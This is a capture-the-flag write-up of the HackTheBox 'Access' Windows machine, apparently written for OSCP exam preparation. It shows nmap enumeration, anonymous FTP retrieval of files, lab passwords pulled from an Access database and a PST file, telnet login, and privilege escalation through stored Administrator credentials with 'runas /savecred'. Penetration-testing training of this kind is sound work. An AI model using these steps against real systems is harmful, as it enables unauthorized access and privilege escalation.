---
layout: post
title:  HTB Access Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-18 15:00:00 +0300
image:  '/images/htb_access.png'
tags:   [Write-ups, HTB, OSCP+, Easy, Windows, FTP-Anonymous, .mdb, Telnet, Stored-Credentials, Runas.exe]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [FTP Anonymous access](#ftp-anonymous-access)
  - [Examining backup.mdb and Access Control.zip and getting credentials of the user security](#examining-backupmdb-and-access-controlzip-and-getting-credentials-of-the-user-security)
- [Foothold](#foothold)
  - [Telnet access using the user security credentials](#telnet-access-using-the-user-security-credentials)
- [Privilege Escalation](#privilege-escalation)
  - [Administrator stored credentials and runas.exe](#administrator-stored-credentials-and-runasexe)

# Enumeration
### Nmap 10.129.223.141
```shell
# Step 1 - Find active ports
nmap -p- -Pn --min-rate 10000 10.129.223.141

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p21,23,80 10.129.223.141
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 08:19 EST
Nmap scan report for 10.129.223.141
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.40 seconds
```

If we examine the results of nmap, we will see that port 21 is accessible with anonymous and port 23 is also open. There seems to be a website running on port 80 too.

### Web Enumeration
Lets visit the website first:
```shell
http://10.129.223.141/
```

There seems to be a photo of some server racks but nothing else.

### FTP Anonymous access

From our nmap scan, we know that we have FTP anonymous access. Lets access it:

```shell
ftp 10.129.223.141    

Connected to 10.129.223.141.
220 Microsoft FTP Service
Name (10.129.223.141:Vorkharium): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

After getting access, we can go on and enumerate the accessible folders and files:

```shell
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> binary
200 Type set to I.
```

We can get mget * to get any file we find:

```shell
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> mget *
mget Access Control.zip [anpqy?]? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************| 10870       96.11 KiB/s    00:00 ETA
226 Transfer complete.
```

After enumerating both folders, we were able to get the following two files:

```shell
backup.mdb
Access Control.zip
```

### Examining backup.mdb and Access Control.zip and getting credentials of the user security
We can use mdb-sql or Microsoft Access to examine backup.mdb. I used Microsoft Access.

Inside auth_user I found the following credentials:

```shell
admin:admin
engineer:access4u@security
backup_admin:admin
```

We were able to unzip Access Control.zip using the password of the user engineer:

```shell
access4u@security
```

After extracting the .zip file, we got a .pst file. We can examine the .pst file using Microsoft Outlook.

Inside the .pst file Access Control.pst we found the credentials of the user security:

```shell
security:4Cc3ssC0ntr0ller
```

# Foothold
### Telnet access using the user security credentials
Now we can try using telnet to get access using the credentials of the user security:

```shell
telnet -l security 10.129.223.141
```

Wait until we get asked to enter a password and enter the following password:

```shell
4Cc3ssC0ntr0ller
```

It worked! We got in:

```shell
*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\security\Desktop\user.txt
```

# Privilege Escalation
### Administrator stored credentials and runas.exe
Lets check if there are any stored credentials:

```shell
C:\Users\security>cmd /;os
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
```

It seems like the credentials of the Administrator are saved.

Knowing this, we can use runas.exe and the saved credentials of the user Administrator to copy the root.txt file to the folder of the user security and be able to read the contents of root.txt after that:

```shell
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\security\root.txt
```